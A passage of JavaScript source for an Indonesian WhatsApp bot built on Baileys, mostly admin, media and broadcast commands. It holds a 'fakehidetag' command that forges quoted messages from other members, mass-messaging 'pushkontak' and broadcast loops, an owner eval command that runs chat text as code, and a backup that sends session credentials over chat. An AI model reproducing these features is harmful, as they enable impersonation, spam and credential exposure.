if (!text) return HuBotZ.sendTextWithMentions(m.chat, `Gunakan dengan cara ${prefix + command} *@tag|text*\n\n_Contoh_\n\n${prefix + command} @${m.sender.split("@")[0]}|Halo`, m)
var org = text.split("|")[0]
var teks = text.split("|")[1];
if (!org.startsWith('@')) return newReply('Tag orangnya')
var mem2 = []
groupMembers.map( i => mem2.push(i.id) )
var mens = parseMention(target)
addCountCmd('#fakehidetag', m.sender, _cmd)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { extemdedTextMessage: { text: `${prefix}hidetag ${teks}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { conversation: `${prefix}hidetag ${teks}` }}
HuBotZ.sendMessage(m.chat, { text: teks ? teks : '', mentions: mem2 }, { quoted: mens.length > 2 ? msg1 : msg2 })
break
case'react':
if (!isPremium) return rely(mess.OnlyPrem)
if (!m.quoted) return newReply(`Balas pesannya`)
if (!text) return newReply(`Masukkan 1 emoji`)
if (!isEmoji(text)) return newReply(`Itu bukan emoji!`)
if (isEmoji(text).length > 1) return newReply(`Satu aja emojinya`)
addCountCmd('#react', m.sender, _cmd)
var reactMsg = { reactionMessage: {
key: {
remoteJid: m.chat,
fromMe: m.key.fromMe,
id: quoted.id
},
text: text
}
}
HuBotZ.sendMessageFromContent(m.chat, reactMsg)
break
case 'setcmd': 
case 'addcmd':{
if (!m.quoted) return newReply( 'Reply Pesan!')
if (!m.quoted.fileSha256) return newReply ('SHA256 Hash Missing')
if (!text) return newReply(`Contoh ${prefix + command} .menu`)
let hash = m.quoted.fileSha256.toString('base64')
if (db.data.sticker[hash] && db.data.sticker[hash].locked) return newReply( 'You have no permission to change this sticker command')
db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
newReply(`Done!`)
}
break
case 'delcmd': {
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return newReply ('SHA256 Hash Missing')
if (db.data.sticker[hash] && db.data.sticker[hash].locked) return newReply( 'You have no permission to change this sticker command')
delete db.data.sticker[hash]
newReply(`Done!`)
}
break
// Owners Menu
case '>':
case '=>':
if (!isCreator) return;
var err = new TypeError;
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return m.reply(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
m.reply(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
m.reply(util.format(_syntax + _err))
}
break;
case 'autodowntiktok':
case 'autodowntt': 
case 'autott': {
if (!isCreator) return reply(mess.OnlyOwner)
if (args[0] === "on") {
addCountCmd('#autodowntt', m.sender, _cmd)
if (isAutoDownTT) return reply(`Already active`)
autotiktok.push(botNumber)
fs.writeFileSync('./database/auto_download/autodowntiktok.json', JSON.stringify(autotiktok, null, 2))
reply('Successfully Activate Auto Download Tiktok')
} else if (args[0] === "off") {
addCountCmd('#autodowntt', m.sender, _cmd)
if (!isAutoDownTT) return reply(`Already disable`)
let anu = autotiktok.indexOf(botNumber)
autotiktok.splice(anu, 1)
fs.writeFileSync('./database/auto_download/autodowntiktok.json', JSON.stringify(autotiktok, null, 2))
reply('Successfully Disabling Auto Download Tiktok')
} else {
reply(`${prefix+command} on -- _activate_\n${prefix+command} off -- _Disable_`)
}
}
break
case 'autodownyoutube':
case 'autodownyt': 
case 'autoyt': {
if (!isCreator) return reply(mess.OnlyOwner)
if (args[0] === "on") {
addCountCmd('#autoyt', m.sender, _cmd)
if (isAutoDownYt) return reply(`Already active`)
autoyt.push(botNumber)
fs.writeFileSync('./database/auto_download/autodownyt.json', JSON.stringify(autoyt, null, 2))
reply('Successfully Activate Auto Download YouTube')
} else if (args[0] === "off") {
addCountCmd('#autodownyt', m.sender, _cmd)
if (!isAutoDownYt) return reply(`Already disable`)
let anu = autoyt.indexOf(botNumber)
autoyt.splice(anu, 1)
fs.writeFileSync('./database/auto_download/autodownyt.json', JSON.stringify(autoyt, null, 2))
reply('Successfully Disabling Auto Download YouTube')
} else {
reply(`${prefix+command} on -- _activate_\n${prefix+command} off -- _Disable_`)
}
}
break
case 'autodownfacebook':
case 'autodownfb': 
case 'autofb': {
if (!isCreator) return reply(mess.OnlyOwner)
if (args[0] === "on") {
addCountCmd('#autodownfb', m.sender, _cmd)
if (isAutoDownFb) return reply(`Already active`)
autofb.push(botNumber)
fs.writeFileSync('./database/auto_download/autodownfb.json', JSON.stringify(autofb, null, 2))
reply('Successfully Activate Auto Download Facebook')
} else if (args[0] === "off") {
addCountCmd('#autodownfb', m.sender, _cmd)
if (!isAutoDownFb) return reply(`Already disable`)
let anu = autofb.indexOf(botNumber)
autofb.splice(anu, 1)
fs.writeFileSync('./database/auto_download/autodownfb.json', JSON.stringify(autofb, null, 2))
reply('Successfully Disabling Auto Download Facebook')
} else {
reply(`${prefix+command} on -- _activate_\n${prefix+command} off -- _Disable_`)
}
}
break
case 'autodowntiktok':
case 'autodowntt': 
case 'autott': {
if (!isCreator) return reply(mess.OnlyOwner)
if (args[0] === "on") {
addCountCmd('#autodownig', m.sender, _cmd)
if (isAutoDownIG) return reply(`Already active`)
autoig.push(botNumber)
fs.writeFileSync('./database/auto_download/autodownig.json', JSON.stringify(autoig, null, 2))
reply('Successfully Activate Auto Download Instagram')
} else if (args[0] === "off") {
addCountCmd('#autodownig', m.sender, _cmd)
if (!isAutoDownIG) return reply(`Already disable`)
let anu = autoig.indexOf(botNumber)
autoig.splice(anu, 1)
fs.writeFileSync('./database/auto_download/autodownig.json', JSON.stringify(autoig, null, 2))
reply('Successfully Disabling Auto Download Instagram')
} else {
reply(`${prefix+command} on -- _activate_\n${prefix+command} off -- _Disable_`)
}
}
break
case 'jadibot': {
if (!isCreator) return reply('*Only Owner!*')
if (m.isGroup) return reply(mess.OnlyPM)
jadibot(HuBotZ, m)
}
break
case 'listjadibot': {
if (!isCreator) return reply('*Only Owner!*')
try {
let user = [... new Set([...global.conns.filter(HuBotZ => HuBotZ.user).map(HuBotZ => HuBotZ.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
y = await HuBotZ.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
HuBotZ.sendMessage(m.chat, { text: te, mentions: [y], }, { quoted: m })
} catch (err) {
m.reply(`Belum Ada User Yang Jadibot`)
}
}
break
case 'device':
if (!isCreator) return reply('*Only Owner!*')
const { getDevice } = require('@whiskeysockets/baileys')
m.reply(await getDevice(m.quoted ? m.quoted.id : m.key.id))
break
case 'totaluserpremium': 
case 'totaluserprem': {
reply(`*Total User Premium Di Bot Ini Ada:* ${premium.length}`)
}
break
case 'totalfitur': {
reply(`*Total Fitur Di Bot Ini Ada:* ${totalFitur()}`)
}
break
case 'totaluser': {
reply(`*Total User Di Bot Ini Ada:* ${users.length}`)
}
break
case 'botstatus': {
if (!isCreator) return reply(mess.OnlyOwner)
let capt = `\t\t_*BOT STATUS*_\n\n> *Public* : ${public ? '_True_' : '_False_'}\n> *Auto_YT* : ${isAutoDownYt ? '_Active_' : '_Deactive_'}\n> *Auto_TT* : ${isAutoDownTT ? '_Active_' : '_Deactive_'}\n> *Auto_FB* : ${isAutoDownFb ? '_Active_' : '_Deactive_'}\n> *Auto_IG* : ${isAutoDownIG ? '_Active_' : '_Deactive_'}\n\n*AUTO Ai*\n> *Auto_AI_PC* : ${isAutoAiPc ? '_Active_' : '_Deactive_'}\n> *Auto_Ai_GC* : ${isAutoAiGc ? '_Active_' : '_Deactive_'}`
reply(capt)
}
break
case 'getcase': {
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("HuBotZ.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
reply(`${getCase(q)}`)
}
break
case 'listgc': {
if (!isCreator) return reply('Lu Siapa Tolol?')
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `*Group Chat*
Total: ${anulistg.length} Group\n\n`
for (let i of anulistg) {
let metadata = await HuBotZ.groupMetadata(i)
teks += `*Name :* ${metadata.subject}
*Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}
*ID :* ${metadata.id}
*Made :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
*Member :* ${metadata.participants.length}\n\n──────────────\n\n`
}
HuBotZ.sendTextWithMentions(m.chat, teks, m)
}
break
case 'joingc': 
case 'join': {
if (!isCreator) return newReply(`Mau sewa bot buat jaga gc? silahkan hubungi owner`)
if (!text) return newReply(`Kirim perintah ${prefix + command} _linkgrup_`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return newReply(mess.emror.Iv)
newReply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await HuBotZ.groupAcceptInvite(result).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
}
break
case 'leavegc': {
if (!isCreator) return newReply(mess.OnlyOwner)
await HuBotZ.groupLeave(m.chat).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
}
break
case 'public': {
if (!isCreator) return reply(mess.OnlyOwner)
if (public) return reply('Still In Public Mode!')
public = true
reply('*Successful Change to Public Mode!*')
}
break
case 'self': {
if (!isCreator) return reply(mess.OnlyOwner)
if (public == false) return reply('Still In Self Mode!')
public = false
reply('*Successfully Changing to Self Mode!*')
}
break
case 'block': case 'blok':
if (!isCreator) return newReply(mess.OnlyOwner) 
if (!text) return newReply(`Masukkan nomor target!`)
let blok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
HuBotZ.updateBlockStatus(blok, 'block')
newReply(`Sukses block @${blok.split('@')[0]}`)
break
case 'unblock': case 'unblok':
if (!isCreator) return newReply(mess.OnlyOwner) 
if (!text) return newReply(`Masukkan nomor target!`)
let unblok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
HuBotZ.updateBlockStatus(unblok, 'unblock')
newReply(`Sukses unblock @${unblok.split('@')[0]}`)
break
case 'listblock': case 'listblok':
let listblok = await HuBotZ.fetchBlocklist()
newReply('*LIST BLOCK*\n' + `Total: ${listblok == undefined ? '*0* Diblokir' : '*' + listblok.length + '* Diblokir'}\n\n` + listblok.map(v => '» @' + v.replace(/@.+/, '')).join`\n`)
break
case 'banchat': {
if (!isCreator) return reply(mess.OnlyOwner)
if (!m.isGroup) return reply('Fitur Khusus Grup!')
addCountCmd('#banchat', m.sender, _cmd)
if (isBanchat) return reply(`udah di ban`)
banchat.push(m.chat)
fs.writeFileSync('./database/ban_database/banchat.json', JSON.stringify(banchat, null, 2))
reply(`The bot succeeded in banning this group`)
}
break
case 'unbanchat': {
if (!isCreator) return reply(mess.OnlyOwner)
if (!m.isGroup) return reply('Fitur Khusus Grup!')
addCountCmd('#unbanchat', m.sender, _cmd)
if (!isBanchat) return reply(`udah di UnBan`)
let anu = banchat.indexOf(m.chat)
banchat.splice(anu, 1)
fs.writeFileSync('./database/ban_database/banchat.json', JSON.stringify(banchat, null, 2))
reply(`Bots have been Unbanned in this group`)
}
break
case 'banuser': {
    if (!isCreator) return reply(mess.OnlyOwner)
    if (!args || !args[0]) return m.reply('Who wants to be banned?')
    let mention = m.mentionedJid[0] || HuBotZ.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || ''
    if (!mention) return m.reply('Tag someone in the group!')
    if (!(mention in db.data.users)) return m.reply('User does not exist in DATABASE!!!')
    let user = db.data.users[mention]
    if (user.banned) return m.reply('User has been banned before!')
    let txt = (args.length > 1 ? args.slice(1).join(' ') : '') || ''
    user.banned = true
    user.BannedReason = txt
    m.reply('Banned USER Successfully!')
    HuBotZ.sendMessage(mention, { 
        text: '*You have been Banned by the OWNER or MODERATOR!!*'})
}
break
case 'unbanuser': {
    if (!isCreator) return reply(mess.OnlyOwner)
    if (!args || !args[0]) return m.reply('Who wants to be banned?')
    let mention = m.mentionedJid[0] || HuBotZ.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || ''
    if (!mention) return m.reply('Tag someone in the group!')
    if (!(mention in db.data.users)) return m.reply('User does not exist in DATABASE!!!')
    let user = db.data.users[mention]
    if (!user.banned) return m.reply('User not banned!')
    user.banned = false
    user.BannedReason = ''
    m.reply('Unbanned USER Successfully!')
    HuBotZ.sendMessage(mention, { 
        text: '*You have been Unbanned by the OWNER or MODERATOR!!*'})
}
break
case 'backup':
case 'backupdata':
case 'backupdatabase': {
if (!isCreator) return reply(mess.OnlyOwner)
m.reply(`_[!] Wait, sending database. . ._`)
try {
await HuBotZ.sendMessage(m.sender, { document: fs.readFileSync('./database/database.json'), fileName: 'database.json', mimetype: 'application/json' }, { quoted: m })
await HuBotZ.sendMessage(m.sender, { document: await fs.readFileSync('./sessions/creds.json'), fileName: 'creds.json', mimetype: 'application/json' }, { quoted: m })
} catch (e) {
console.log(e)
m.reply('terjadi kesalahan, cek logs.')
}
}
break
case 'sampahstick':
case 'sampahstik':
case 'sampahsticker':
if (!isCreator) return newReply(mess.OnlyOwner)
let all = await fs.readdirSync('./sticker')
var teks = `JUMLAH SAMPAH SYSTEM\n\n`
teks += `Total : ${all.filter(v => v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") || v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") || v.endsWith("webp") || v.endsWith("webm") ).map(v=>v).length} Sampah\n\n`
teks += all.filter(v => v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") || v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") || v.endsWith("webp") || v.endsWith("webm") ).map(o=>`${o}\n`).join("");
newReply(teks)
break
case 'delsampahstik':
case 'delsampahstick':
case 'delsampahsticker': {
if (!isCreator) return newReply(mess.OnlyOwner)
let directoryPath = path.join('./sticker') //&& './media') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return newReply('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm")  )
var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return newReply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})
newReply(teks)
await sleep(2000)
newReply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./sticker/${file}`) //&& `./media/${file}`) 
});
await sleep(2000)
newReply("Berhasil menghapus semua sampah")
});
}
break
case 'delsesi':  
case 'delsesion': 
case 'delsesions': {
if (!isCreator) return newReply(mess.OnlyOwner)
fs.readdir("./sessions", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return m.reply('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file sampah\n\n`
if(filteredArray.length == 0) return m.reply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
m.reply(teks) 
await sleep(2000)
m.reply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./sessions/${file}`)
});
await sleep(2000)
m.reply("Berhasil menghapus semua sampah di folder session")     
});
}
break
case 'setppbot': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (!quoted) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await HuBotZ.downloadAndSaveMediaMessage(quoted)
await HuBotZ.updateProfilePicture(global.botnumber, { url: media }).catch((err) => fs.unlinkSync(media))
newReply("Done")
}
break
case 'nsfw': {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === 'on') {
if (isNsfw) return newReply("NSFW Udh on di group ini")
_nsfw.push(m.chat)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(_nsfw))
newReply("Nsfw berhasil di aktifkan di group ini")
} else if (args[0] === 'off') {
if (!isNsfw) return newReply("NSFW Udh off di group ini")
_nsfw.splice(m.chat, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(_nsfw))
newReply("Nsfw berhasil di nonaktifkan di group ini")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case 'autobio': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === "on") {
if (global.autobio === true) return newReply("Udh on")
global.autobio = true
newReply("Autobio berhasil diaktifkan")
} else if (args[0] === "off") {
if (global.autobio === false) return newReply("Udh off")
global.autobio = false
newReply("Autobio berhasil dinonaktifkan")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case 'anticall': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === "on") {
if (global.anticall === true) return newReply("Udh on")
global.anticall = true
newReply("Anticall berhasil diaktifkan")
} else if (args[0] === "off") {
if (global.anticall === false) return newReply("Udh off")
global.anticall = false
newReply("Anticall berhasil dinonaktifkan")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'autorespond': {
if (!isCreator) return reply(mess.OnlyOwner)
if (args[0] === "on") {
if (global.autorespond === true) return m.reply("Udh on")
global.autorespond = true
m.reply("Autorespond berhasil diaktifkan")
} else if (args[0] === "off") {
if (global.autorespond === false) return m.reply("Udh off")
global.autorespond = false
m.reply("Autorespond berhasil dinonaktifkan")
} else {
m.reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'autoblok': case 'autoblok212': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === "on") {
if (global.autoblok212 === true) return newReply("Udh on")
global.autoblok212 = true
newReply("Autoblok berhasil diaktifkan")
} else if (args[0] === "off") {
if (global.autoblok212 === false) return newReply("Udh off")
global.autoblok212 = false
newReply("Autoblok berhasil dinonaktifkan")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case 'autoread': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === "on") {
if (global.autoread === true) return newReply("Udh on")
global.autoread = true
newReply("Autoread berhasil diaktifkan")
} else if (args[0] === "off") {
if (global.autoread === false) return newReply("Udh off")
global.autoread = false
newReply("Autoread berhasil dinonaktifkan")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case 'addstiker': 
case 'addsticker': 
case 'addstik': {
if (!m.key.fromMe && !isCreator) return newReply(mess.OnlyOwner)
if (!/webp/.test(mime)) return newReply(`Contoh : ${prefix + command} halo`)
if (!text) return newReply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return newReply(`Contoh : ${prefix + command} halo`)
let media = await HuBotZ.downloadMediaMessage(quoted)
stiker.push(`${text}`)
fs.writeFileSync(`./database/${text}.webp`, media)
fs.writeFileSync('./database/stik.json', JSON.stringify(stiker))
newReply(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststicker`)
}
break
case 'liststik': 
case 'liststicker':
case 'liststiker': 
case 'liststc':{
teks = '*STICKER LIST :*\n\n'
for (let awokwkwk of setiker) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${stiker.length}*\n\n_Untuk mengambil sticker silahkan kirim pesan sesuai list stiker di atas_`
newReply(teks)
break
}
case 'addfoto': 
case 'addimage': 
case 'addphoto': 
case 'addimg': {
if (!m.key.fromMe && !isCreator) return newReply(mess.OnlyOwner)
if (!/image/.test(mime)) return newReply(`Contoh : ${prefix + command} halo`)
if (!text) return newReply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return newReply(`Contoh : ${prefix + command} halo`)
let media = await HuBotZ.downloadMediaMessage(quoted)
imagenya.push(`${text}`)
fs.writeFileSync(`./database/${text}.jpg`, media)
fs.writeFileSync('./database/image.json', JSON.stringify(imagenya))
newReply(`Sukses Menambahkan Image\nCek dengan cara ${prefix}listimg`)
}
break
case 'listimage': 
case 'imagelist': 
case 'listimg': {
teks = '*IMAGE LIST :*\n\n'
for (let mmk of imagenya) {
teks += `- ${mmk}\n`
}
teks += `\n*Total : ${imagenya.length}*\n\n_Untuk mengambil Gambar kirim pesan sesuai list image di atas`
reply(teks)
break
}
case 'addvideo': 
case 'addvidio': 
case 'addvid':{
if (!m.key.fromMe && !isCreator) return newReply(mess.OnlyOwner)
if (!/video/.test(mime)) return newReply(`Contoh : ${prefix + command} halo`)
if ((quoted.msg || quoted).seconds > 31) return newReply('Maksimal 30 detik')
if (!text) return newReply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return newReply(`Contoh : ${prefix + command} halo`)
let media = await HuBotZ.downloadMediaMessage(quoted)
videonye.push(`${text}`)
fs.writeFileSync(`./database/${text}.mp4`, media)
fs.writeFileSync('./database/video.json', JSON.stringify(videonye))
newReply(`Sukses Menambahkan Video\nCek dengan cara ${prefix}listvid`)
}
break
case 'videolist': case 'listvidio': case 'listvid': case 'listvideo':{
teks = '*VIDEO LIST :*\n\n'
for (let awokwkwk of videonye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${videonye.length}*\n\n_Untuk mengambil video silahkan kirim pesan sesuai list video di atas_`
newReply(teks)
break
}
case 'addaud': 
case 'addaudio': 
case 'addvn': {
if (!m.key.fromMe && !isCreator) return newReply(mess.OnlyOwner)
if (!/audio/.test(mime)) return newReply(`Contoh : ${prefix + command} halo`)
if ((quoted.msg || quoted).seconds > 31) return newReply('Maksimal 30 detik')
if (!text) return newReply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return newReply(`Contoh : ${prefix + command} halo`)
let media = await HuBotZ.downloadMediaMessage(quoted)
audionye.push(`${text}`)
fs.writeFileSync(`./database/${text}.mp3`, media)
fs.writeFileSync('./database/vn.json', JSON.stringify(audionye))
newReply(`Sukses Menambahkan Vn / audio \nCek dengan cara ${prefix}listvn`)
}
break
case 'listvn': 
case 'listaudio': {
teks = '*AUDIO LIST :*\n\n'
for (let awokwkwk of audionye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${audionye.length}*\n\n_Untuk mengambil audio silahkan kirim pesan sesuai list audio di atas_`
newReply(teks)
break
}
case 'bcimage': case 'bcimg':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply(`Reply foto dengan caption ${prefix + command} Tes`)
if (!/image/.test(mime)) return newReply(`Reply foto dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await HuBotZ.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
HuBotZ.sendMessage(apaan, {image: buffer, caption: txt}, {quoted: fkontak})
}
newReply('Sukses Broadcast')
}
break
case 'bcvideo': case 'bcvid':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply(`Reply video dengan caption ${prefix + command} Tes`)
if (!/video/.test(mime)) return newReply(`Reply video dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await HuBotZ.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
HuBotZ.sendMessage(apaan, {video: buffer, caption: txt, mimetype: 'video/mp4', duration: 909090909}, {quoted: fkontak})
}
newReply('Sukses Broadcast')
}
break
case 'bcaudio': case 'bcaud':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (!/audio/.test(mime)) return newReply(`Reply audio dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await HuBotZ.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
HuBotZ.sendMessage(apaan, {audio: buffer, mimetype: 'audio/mpeg', ptt: false, duration: 909090909}, {quoted: fkontak})
}
newReply('Sukses Broadcast')
}
break
case 'bcvn': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (!/audio/.test(mime)) return newReply(`Reply audio dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await HuBotZ.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
HuBotZ.sendMessage(apaan, {audio: buffer, mimetype: 'audio/mpeg', ptt: true, duration: 909090909}, {quoted: fkontak})
}
newReply('Sukses Broadcast')
}
break
case 'bcstiker': case 'bcstik': case 'bcsticker':{
if (!isCreator) return newReply(mess.OnlyOwner)
 if (!/webp/.test(mime)) return newReply(`Reply stiker dengan caption ${prefix + command}`)
let anu = await store.chats.all().map(v => v.id)
let media = await HuBotZ.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
HuBotZ.sendMessage(apaan, {sticker :{url : media}}, {quoted: fkontak})
}
newReply('Sukses Broadcast')
}
break
case 'bc': case 'broadcast': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply (`Example : ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let todd = await HuBotZ.reSize(`${global.thumb}`, 300, 300) 
newReply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let apaan of anu) {
await sleep(1500)
HuBotZ.sendMessage(apaan, {image: fs.readFileSync(global.thumb), caption: `*BROADCAST*\n\n${text}`})
}
newReply('Sukses Broadcast')
}
break
case 'pushkontak': {
if (!isCreator) return newReply('*Khusus Owner Bot*')
if (!m.isGroup) return newReply('Hanya bisa digunakan di dalam grup')
var name = text.split('|')[0]
var chet = text.split('|')[1]
if (!name) return newReply(`Masukan nama lu yang bener cok\n contoh: ${prefix+command} HuBotZ|sv uy udh gw sv back`) 
if (!chet) return newReply(`Masukan nama lu yang bener cok\n contoh: ${prefix+command} HuBotZ|sv uy udh gw sv back`) 
let kontk = {
displayName: "Contact",
contacts: [{
displayName: name,
vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;" + name + ";;;\nFN:" + name + "\nitem1.TEL;waid=" + m.sender.split('@')[0] + ":" + m.sender.split('@')[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
}]
}
let pkDetect = await HuBotZ.groupMetadata(m.chat)
if (pkDetect.participants.length > 400) return newReply('Batas member maksimal; 400')
newReply('Gasken pushkontak total member ' + pkDetect.participants.length + ' member')
for (let a of pkDetect.participants) {
HuBotZ.sendMessage(a.id, {
contacts: kontk
})
await sleep(500)
HuBotZ.sendMessage(a.id, {
text: chet,
contextInfo:
{
"externalAdReply": {
"title": botName, 
"body": `Ijin Pushkontak Om`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: instagram, 
thumbnailUrl: global.thumb, 
}
}
})
await sleep(500)
} // (?); kirim pesan ke semua peserta grup
newReply('(Group: *' + pkDetect.subject + '*\nMember: ' + pkDetect.participants.length + '\ndelay: 500\nBERHASIL PUSH')
	}
break
case 'delchat':
if (!isCreator) return newReply(mess.OnlyOwner)
var teks = q ? q : m.chat
await HuBotZ.chatModify({delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]}, teks)
newReply('Sukses!')
break
case 'bcsewa': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply (`Example : ${prefix + command} Tes`)
addCountCmd('#bcsewa', m.sender, _cmd)
for (let i of sewa){
await HuBotZ.sendMessage(i.id, { text: text })
await sleep(3000) 
}
newReply(`Sukses bc ke ${sewa.length}`)
}
break
case 'addprem': {
if (!isCreator) return reply(mess.OnlyOwner)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return newReply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
addCountCmd('#addprem', m.sender, _cmd)
_prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
} else {
var cekap = await HuBotZ.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return newReply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
addCountCmd('#addprem', m.sender, _cmd)
_prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
}}
break
case 'delprem': {
if (!isCreator) return newReply(mess.OnlyOwner)
